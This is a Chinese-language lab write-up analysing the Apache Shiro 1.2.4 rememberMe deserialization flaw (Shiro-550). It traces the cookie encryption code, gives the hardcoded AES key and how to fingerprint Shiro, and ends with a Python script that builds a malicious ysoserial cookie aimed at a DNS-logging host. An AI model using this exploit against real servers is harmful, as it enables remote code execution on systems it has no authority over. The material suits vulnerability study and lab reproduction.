@@ -1,0 +1,668 @@
+### Shiro 550反序列化漏洞分析：
+
+利用条件：
+
+shiro版本<=1.2.4
+
+
+
+
+
+#### 环境1：
+
+搭建环境。
+
+
+
+shiro支持将持久化信息(登录、身份验证相关的)序列化后再加密，最后保存再cookie的rememberMe字段中。
+
+若登录时选中了rememberMe，则登录成功后后服务端会返回一个包含在cookie中的rememberMe字段，该字段的值是包含用户的身份验证等信息先序列化再加密的字符串。后面拿着cookie就能直接访问了(核心是这个rememberMe字段)。 服务端验证：解密->反序列化->验证信息。
+
+
+
+服务端验证逻辑：
+
+拿到rememberMe的cookie值 --> Base64解码 --> AES解密 --> 反序列化->验证信息。
+
+
+
+AES的密钥是硬编码(即直接写在源码中)的，故使得攻击者利用反序列化造成RCE：
+
+payload明文->序列化->使用key进行AES加密->base64编码->放在Cookie的rememberMe字段并发送到服务端.
+
+
+
+核心点：需有AES加密算法的key值。
+
+
+
+访问：
+
+http://192.168.88.236:8080/shirodemo-1.0-SNAPSHOT/login.jsp;jsessionid=EEAA9A58B59B5DA2F3EFCE1EDC6B941D
+
+或
+
+http://192.168.88.236:8080/shirodemo-1.0-SNAPSHOT/login.jsp
+
+
+
+#### shiro特征：
+
+**未登录情况下：**
+
+cookie中没有rememberMe字段。 即使选上了remember选项，也只是在POST数据中多了一项rememberMe=on而已。
+
+
+
+且无论如何返回包中都有一项：
+
+Set-Cookie: rememberMe=deleteMe;
+
+
+
+
+
+**登录情况下：**
+
+不勾选rememberMe：只是使用Cookie中的JSESSIONID作为身份验证。
+
+返回包中有一项：
+
+Set-Cookie: rememberMe=deleteMe;
+
+
+
+勾选rememberMe：POST数据中多了一项rememberMe=on
+
+且返回包中除了有一项Set-Cookie: rememberMe=deleteMe; 还有一项Set-Cookie: rememberMe=xxxx;
+
+如：
+
+```
+Set-Cookie: rememberMe=deleteMe; Path=/shirodemo-1.0-SNAPSHOT; Max-Age=0; Expires=Tue, 14-Dec-2021 10:34:48 GMT
+Set-Cookie: rememberMe=5SMQ8tjanD/TPlBO1kJFLpMSwZUNurJzgsCHMsJAQUFJ6Nlu+Z8DOfHORBQz3ba/OaD0E+qZz5IOAAwULO3js5MqPrJB6Q4dstCCZBJeswEUDuCDjnwv+Z68nn4SJCXR6Z4mncWbXYi5S31u2VXyuwgMnCvsq73KSyISca18otn9vpzT2vPz0d0Vc6kfOPymDjVo7gOmtu5oY91YZ5rfo6P6ovRLC2wf+l+Hhi6twE4ny0pCRGhSorn6uVmSiLCU/XeReOjYTurtijIIWYprNFHHU+Tb0Z8Vn2Fz8V2dJmZW/KQc3RCxhyXjpBYMiZmYZmqSKJvV9fHiZlwRQlt5G4WSd2zgcX8fIXW73dLk4WyVHwP+dfxGHgATI0nTC0QcMUih+BtsLZuhnOFrOOfYz6K5Ejrkv9uMKtZT+2owU+Z6/B0YfBDYkkpPJsm0728r9Axi2DThWVTi3P67l2I1Zw9TQ6MqkjL1Q4JrA6ye9catCwi6GgEyoaw3iITNYBVh; Path=/shirodemo-1.0-SNAPSHOT; Max-Age=31536000; Expires=Thu, 15-Dec-2022 10:34:49 GMT; HttpOnly
+```
+
+
+
+
+
+#### 漏洞复现：
+
+验证shiro框架：
+
+核心：返回包中的Set-Cookie: rememberMe=deleteMe;关键字符串。
+
+常用手法：
+
+Cookie中添加一项：rememberMe=123
+
+如：
+
+```
+Cookie: rememberMe=123;askdk=35456
+```
+
+查看返回包中是否有Set-Cookie: rememberMe=deleteMe;关键字符串。
+
+
+
+
+
+使用shiro反序列化漏洞利用工具，成功执行命令。
+
+
+
+
+
+#### 漏洞分析：
+
+shiro 1.2.24中，提供了硬编码的AES密钥：kPH+bIxk5D2deZiIxcaaaA==
+
+Shiro≤1.2.4版本默认使用`CookieRememberMeManager`
+
+
+
+
+
+##### 加密：
+
+CookieRememberMeManager类入手：
+
+CookieRememberMeManager类继承了AbstractRememberMeManager，跟进AbstractRememberMeManager，其又重写了`RememberMeManager`接口，跟进`RememberMeManager`接口->
+
+发现里面有一些：登录成功的处理函数、登录失败的处理函数等。
+
+故登录成功肯定会调用该登录成功的接口和重写该函数：此处下断点。
+
+
+
+跟进到onSuccessfulLogin()->
+
+发现：
+
+```
+if (this.isRememberMe(token)){
+	this.rememberIdentity(subject,token,info);
+}else if (log.isDebug...)
+...
+```
+
+此方法大致作用：若选上了isRememberMe，就拿着身份信息去验证。
+
+因为选上了isRememberMe，故跟进到this.rememberIdentity(subject,token,info);
+
+发现：
+
+```
+public void rememberIdentity(subject,token,authInfo){
+	PrincipalCollection principals = this.getIdentityToRemember(subject,authInfo);
+	this.rememberIdentity(subject,principals);
+}
+```
+
+根据this.rememberIdentity(subject,principals);此行的断点得知，subject存的是session等，authInfo存的是用户名。 PrincipalCollection是一个身份集合。
+
+跟进到this.rememberIdentity(subject,principals)：
+
+发现：
+
+Principals：主要的
+
+```
+protected void rememberIdentify(Subject subject,PrincipalCollection accountPtincipals){
+	byte[] bytes=this.convertPrincipalsToBytes(accountPtincipals);
+	this.rememberSerializedIdentify(subject,bytes);
+}
+```
+
+跟进convertPrincipalsToBytes()：发现：将用户传入的凭证等信息序列化再加密。
+
+```
+protected byte[] convertPrincipalsToBytes(PrincipalCollection principals) {
+        byte[] bytes = serialize(principals);
+        if (getCipherService() != null) {
+            bytes = encrypt(bytes);
+        }
+        return bytes;
+    }
+```
+
+可能是将用户凭证序列化，跟进serialize()：发现：
+
+```
+protected byte[] serialize(PrincipalCollection principals) {
+        return getSerializer().serialize(principals);
+    }
+```
+
+继续跟进getSerializer().serialize(principals)：即`DefaultSerializer`类的`serialize`方法，发现：
+
+getSerializer()应该是获取一个序列化的对象。
+
+```
+public byte[] serialize(T o) throws SerializationException {
+        if (o == null) { 	
+            String msg = "argument cannot be null.";
+            throw new IllegalArgumentException(msg);
+        }
+        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+        BufferedOutputStream bos = new BufferedOutputStream(baos);
+
+        try {
+            ObjectOutputStream oos = new ObjectOutputStream(bos);
+            oos.writeObject(o); 	//序列化
+            oos.close();
+            return baos.toByteArray();
+        } catch (IOException e) {
+           ...
+        }
+    }
+```
+
+writeObject()：序列化
+
+readObject()：反序列化
+
+分析：
+
+先转为byte，写入缓冲区；再进行序列化，最后通过`toByteArray()`方法返回序列化后的Byte数组。
+
+
+
+
+
+
+
+跳回到convertPrincipalsToBytes()，跟进：
+
+```
+if (getCipherService() != null) {
+            bytes = encrypt(bytes);
+        }
+```
+
+跟进getCipherService()->
+
+Cipher：密码
+
+发现：
+
+```
+public CipherService getCipherService() {
+        return cipherService;
+    }
+```
+
+在return cipherService处下断点，发现其为AesCipherService，搜索并跟进AesCipherService：
+
+发现是Aes的加密。故前面应该是要获取到密码服务才会encrypt.
+
+或：
+
+发现该class的cipherService为：
+
+```
+public AbstractRememberMeManager() {
+        this.serializer = new DefaultSerializer<PrincipalCollection>();
+        this.cipherService = new AesCipherService();
+        setCipherKey(DEFAULT_CIPHER_KEY_BYTES);
+    }
+```
+
+应该是new了一个Aes加密对象。
+
+跟进 new AesCipherService()：
+
+应该就是获取一个AES_CBC加密对象了。
+
+
+
+全局搜索DEFAULT_CIPHER_KEY_BYTES或下断点，发现：
+
+```
+public abstract class AbstractRememberMeManager implements RememberMeManager {
+
+private static final byte[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode("kPH+bIxk5D2deZiIxcaaaA==");
+}
+```
+
+这很可能就是AES加密的固定密钥IV，因为AES_CBC加密方式过程如下：key作为密钥，iv作为偏移量(补齐使用)：
+
+![q1](.\imgs\q1.png)
+
+
+
+
+
+跟进到setCipherKey()，发现：
+
+```
+public void setCipherKey(byte[] cipherKey) {
+        //Since this method should only be used in symmetric ciphers
+        //(where the enc and dec keys are the same), set it on both:
+        setEncryptionCipherKey(cipherKey);
+        setDecryptionCipherKey(cipherKey);
+    }
+```
+
+故加密解密都是使用的同一个IV.
+
+
+
+
+
+
+
+
+
+
+
+
+
+跳出并跟进到encrypt()：
+
+发现：
+
+```
+protected byte[] encrypt(byte[] serialized) {
+        byte[] value = serialized;
+        CipherService cipherService = getCipherService();
+        if (cipherService != null) {
+            ByteSource byteSource = cipherService.encrypt(serialized, getEncryptionCipherKey());
+            value = byteSource.getBytes();
+        }
+        return value;
+    }
+```
+
+应该是将序列化后的值进行Aes加密。 getEncryptionCipherKey()应该是获取AES的加密key.
+
+分析：获取key将序列化后的值进行AES加密，再转为byte字节，再转为byte[]，最后返回。
+
+跟进getEncryptionCipherKey()：发现：
+
+```
+public byte[] getEncryptionCipherKey() {
+        return encryptionCipherKey;
+    }
+```
+
+跟前面分析一样的。
+
+
+
+跟进cipherService.encrypt()：发现：
+
+```
+public ByteSource encrypt(byte[] plaintext, byte[] key) {
+        byte[] ivBytes = null;
+        boolean generate = isGenerateInitializationVectors(false);
+        if (generate) {
+            ivBytes = generateInitializationVector(false);
+            if (ivBytes == null || ivBytes.length == 0) {
+               ...
+            }
+        }
+        return encrypt(plaintext, key, ivBytes, generate);
+    }
+```
+
+
+
+跟进isGenerateInitializationVectors()，发现：
+
+```
+protected boolean isGenerateInitializationVectors(boolean streaming) {
+        return isGenerateInitializationVectors();
+    }
+```
+
+跟进isGenerateInitializationVectors()：发现：
+
+```
+public boolean isGenerateInitializationVectors() {
+        return generateInitializationVectors;
+    }
+```
+
+发现this.generateInitializationVectors在构造函数中被设置为true.
+
+
+
+
+
+继续跟进到ivBytes = generateInitializationVector(false)：发现：
+
+```
+protected byte[] generateInitializationVector(boolean streaming) {
+        int size = getInitializationVectorSize();
+        if (size <= 0) {
+          	...
+        }
+        if (size % BITS_PER_BYTE != 0) {
+            ...
+        }
+        int sizeInBytes = size / BITS_PER_BYTE;
+        byte[] ivBytes = new byte[sizeInBytes];
+        SecureRandom random = ensureSecureRandom();
+        random.nextBytes(ivBytes);
+        return ivBytes;
+    }
+```
+
+下断点后发现返回的是16字节的随机字节数组。
+
+应该就是填充字节补足长度使用，解密后再删除而已。返回补足后的ivbytes.
+
+
+
+
+
+继续跟进到return encrypt(plaintext, key, ivBytes, generate)：发现：
+
+```
+ private ByteSource encrypt(byte[] plaintext, byte[] key, byte[] iv, boolean prependIv) throws CryptoException {
+        final int MODE = javax.crypto.Cipher.ENCRYPT_MODE;
+        byte[] output;
+        if (prependIv && iv != null && iv.length > 0) {
+            byte[] encrypted = crypt(plaintext, key, iv, MODE);
+            output = new byte[iv.length + encrypted.length];
+            //now copy the iv bytes + encrypted bytes into one output array:
+            // iv bytes:
+            System.arraycopy(iv, 0, output, 0, iv.length);
+            // + encrypted bytes:
+            System.arraycopy(encrypted, 0, output, iv.length, encrypted.length);
+        } else {
+            output = crypt(plaintext, key, iv, MODE);
+        }
+        if (log.isTraceEnabled()) {
+            log.trace("Incoming plaintext of size " + (plaintext != null ? plaintext.length : 0) + ".  Ciphertext " +
+                    "byte array is size " + (output != null ? output.length : 0));
+        }
+        return ByteSource.Util.bytes(output);
+    }
+```
+
+使用aes_cbc模式(key固定、iv为随机16bit)对个人身份登录信息(序列化后的)加密，填充再返回。
+
+
+
+最终返回到：
+
+protected void rememberIdentify(Subject subject,PrincipalCollection accountPtincipals){
+	byte[] bytes=this.convertPrincipalsToBytes(accountPtincipals);
+	this.rememberSerializedIdentify(subject,bytes);
+}
+
+的this.rememberSerializedIdentify(subject,bytes); 	其中bytes为加密后的bytes数据。
+
+跟进rememberSerializedIdentify()，发现：
+
+```
+protected void rememberSerializedIdentity(Subject subject, byte[] serialized) {
+        if (!WebUtils.isHttp(subject)) {
+            ...
+            }
+            return;
+        }
+        HttpServletRequest request = WebUtils.getHttpRequest(subject);
+        HttpServletResponse response = WebUtils.getHttpResponse(subject);
+        //base 64 encode it and store as a cookie:
+        String base64 = Base64.encodeToString(serialized);
+        Cookie template = getCookie(); //the class attribute is really a template for the outgoing cookies
+        Cookie cookie = new SimpleCookie(template);
+        cookie.setValue(base64);
+        cookie.saveTo(request, response);
+    }
+```
+
+将aes加密后的数据base64编码并将其放在cookie中，并返回。
+
+
+
+
+
+
+
+##### 解密：
+
+搜索decrypt，发现：
+
+```
+protected byte[] decrypt(byte[] encrypted) {
+        byte[] serialized = encrypted;
+        CipherService cipherService = getCipherService();
+        if (cipherService != null) {
+            ByteSource byteSource = cipherService.decrypt(encrypted, getDecryptionCipherKey());
+            serialized = byteSource.getBytes();
+        }
+        return serialized;
+    }
+```
+
+下断点，跟进到getDecryptionCipherKey()，发现其使用同样的key对其解密，跟进cipherService.decrypt()：
+
+发现：
+
+```
+public ByteSource decrypt(byte[] ciphertext, byte[] key) throws CryptoException {
+        byte[] encrypted = ciphertext; //传过来的rememberMe值(加密的)
+        byte[] iv = null;
+        if (isGenerateInitializationVectors(false)) {
+            try {
+                //the IV to decrypt the real ciphertext:
+                int ivSize = getInitializationVectorSize();
+                int ivByteSize = ivSize / BITS_PER_BYTE; //16bit
+                iv = new byte[ivByteSize];
+                
+                //提取ciphertext中的前16位作为iv
+                System.arraycopy(ciphertext, 0, iv, 0, ivByteSize);
+
+				//后面的作为真正的加密部分
+                int encryptedSize = ciphertext.length - ivByteSize;
+                encrypted = new byte[encryptedSize];
+                System.arraycopy(ciphertext, ivByteSize, encrypted, 0, encryptedSize);
+            } catch (Exception e) {
+				...
+            }
+        }
+        //key、iv进行aes_cbc解密。
+        return decrypt(encrypted, key, iv);
+    }
+```
+
+
+
+**java.lang.System.arraycopy()**方法：
+
+```
+public static void arraycopy(Object src, int srcPos, Object dest, int destPos, int length)
+```
+
+
+
+
+
+在`getRememberedPrincipals`方法处下断点，发现：
+
+```
+public PrincipalCollection getRememberedPrincipals(SubjectContext subjectContext) {
+        PrincipalCollection principals = null;
+        try {
+            byte[] bytes = getRememberedSerializedIdentity(subjectContext);
+            if (bytes != null && bytes.length > 0) {
+                principals = convertBytesToPrincipals(bytes, subjectContext);
+            }
+        } catch (RuntimeException re) {
+            principals = onRememberedPrincipalFailure(re, subjectContext);
+        }
+        return principals;
+    }
+```
+
+跟进getRememberedSerializedIdentity()，发现：
+
+```
+protected byte[] getRememberedSerializedIdentity(SubjectContext subjectContext) {
+        WebSubjectContext wsc = (WebSubjectContext) subjectContext;
+        HttpServletRequest request = WebUtils.getHttpRequest(wsc);
+        HttpServletResponse response = WebUtils.getHttpResponse(wsc);
+        //读到cookie中的base64值
+        String base64 = getCookie().readValue(request, response);
+
+        if (base64 != null) {
+            base64 = ensurePadding(base64);
+            //base64解密
+            byte[] decoded = Base64.decode(base64);
+            return decoded;
+        } 
+    }
+```
+
+返回base64解密后的值。
+
+
+
+跟进convertBytesToPrincipals()，发现：
+
+```
+protected PrincipalCollection convertBytesToPrincipals(byte[] bytes, SubjectContext subjectContext) {
+        if (getCipherService() != null) {
+            bytes = decrypt(bytes);
+        }
+        return deserialize(bytes);
+    }
+```
+
+aes解密跟前面分析一样的，再返回序列化后的值，再反序列化。
+
+反序列化实现方法：
+
+```
+T deserialized = (T) ois.readObject();
+```
+
+
+
+
+
+至此，加密和解密过程分析完毕。
+
+
+
+##### 手写脚本生成payload并利用：
+
+```
+# －*-* coding:utf-8
+import base64
+import uuid
+import subprocess
+from Crypto.Cipher import AES
+
+def rememberme(command):
+    # popen = subprocess.Popen(['java', '-jar', 'ysoserial-0.0.6-SNAPSHOT-all.jar', 'URLDNS', command], stdout=subprocess.PIPE)
+    
+    popen = subprocess.Popen(['java', '-jar', 'ysoserial.jar', 'URLDNS', command],
+                             stdout=subprocess.PIPE)
+    
+    # popen = subprocess.Popen(['java', '-jar', 'ysoserial-0.0.6-SNAPSHOT-all.jar', 'JRMPClient', command], stdout=subprocess.PIPE)
+    
+
+    BS = AES.block_size
+    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
+    key = "kPH+bIxk5D2deZiIxcaaaA=="
+    mode = AES.MODE_CBC
+    iv = uuid.uuid4().bytes
+    encryptor = AES.new(base64.b64decode(key), mode, iv)
+    file_body = pad(popen.stdout.read())
+
+    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
+    return base64_ciphertext
+    
+if __name__ == '__main__':
+    
+    # payload = encode_rememberme('127.0.0.1:12345')
+    # payload = rememberme('calc.exe')
+    
+    #payload = rememberme('http://u89cy6.dnslog.cn')
+    
+
+    payload = rememberme('http://8073a53b.dns.1433.eu.org.')
+
+    with open("./payload.cookie", "w") as fpw:
+
+        #decode() 将str转为unicode类型，如：<type 'unicode'>或u'asd dfe'
+        print("rememberMe={}".format(payload.decode()))
+        res = "rememberMe={}".format(payload.decode())
+        fpw.write(res)
+```
+
+成功在dnslog平台接收到数据。
+
+
+
+利用CC链进行命令执行。
+
+
+
